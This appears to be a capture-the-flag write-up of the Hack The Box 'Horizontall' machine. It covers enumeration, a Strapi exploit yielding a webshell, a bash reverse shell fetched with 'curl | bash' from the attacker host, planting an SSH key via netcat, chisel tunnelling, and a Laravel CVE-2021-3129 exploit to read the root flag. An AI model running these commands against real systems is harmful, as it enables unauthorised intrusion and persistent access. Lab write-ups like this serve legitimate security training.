---
title: Horizontall Machine HTB
date: 2023-02-1 00:18:00 +0700
categories: [TOP_CATEGORIE, SUB_CATEGORIE]
tags: [machines]
---

## Enumeration 

```ruby
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
| 2048 ee774143d482bd3e6e6e50cdff6b0dd5 (RSA)
|_ 256 3ad589d5da9559d9df016837cad510b0 (ECDSA)
|_ 256 4a0004b49d29e7af37161b4f802d9894 (ED25519)
80/tcp open http nginx 1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.56 seconds
```

We see that it redirects us to horizontall.htb, so we add it to `/etc/hosts

Investigating the page, we see that it has nothing.

We are going to put a dirsearch and we only find `/js, /css and /html`, so we are going to investigate it. 

## User exploit

we are going to make a curl to the page to see it pretty

```shell
curl -s -X GET "http://horizontall.htb" | htmlq -p | cat -l html
```

we see several .js scripts, but specifically the `app-c68eb462.js` reports a new .htb page using the grep parameter:

```shell
curl -s -X GET "http://horizontall.htb//js/app.c68eb462.js" | grep "\.htb" 
```

so let's add it to /etc/hosts and investigate it. At first we don't see anything. Let's put a dirbuster on it

We find a `/admin`, but trying to put a sqli, we have no luck, so we are going to look for an exploit for Strapi.

We find one that when we run it gives us a webhsell, which we can use to send us a reverse shell, but first we are going to send us a package:

```bash
sudo tcpdump -i tun0 icmp
```

but first we have to create the index.html file inside X directory:

```shell
/bin/bash
bash -i >&/dev/tcp/10.10.14.62/1234 0>&1
```

we create a python sv in that directory 

and then we do a curl to that file from the victim machine

```shell
curl http://10.10.14.62 | bash
```

and in this way we get a reverse shell.

## Root exploitation

if we do a 
```shell
netstat -nat 
```
we can see that we have port 8000 open, so we can do Remote Port Forwarding (RPF) with chissel:

We download chissel and install it:

```shell
go build -ldflags "-s -w"
```

We set up a chisel server on our machine:

```shell
./chisel server -p 9999 --reverse
```

and one as a client on the victim:

```shell
./chisel client 10.10.14.62:9999 R:8000:127.0.0.1:8000
```

As this gives us error (glibc6_2.34 is missing) we are going to do it using this command, but first we pass our id_rsa to the victim machine to be able to connect via ssh.

```shell
ssh-keygen
nc -nlvp 1234 < /home/viksant/.ssh/id_rsa.pub (local)
nc -nv 10.10.14.62 1234 > authorized_keys
chmod 600 authorized_keys
```

```shell
ssh -i strapi -L 8000:localhost:8000 strapi@horizontall.htb
```

and we can see a Laravel v8, which is exploitable.

We download `` nth347 /CVE-2021-3129_exploit `` 

and run it:

```shell
 python3 exploit.py http://127.0.0.1:8000 Monolog/RCE1 'cat /root/root.txt'
```

and we can see the root.txt flag.
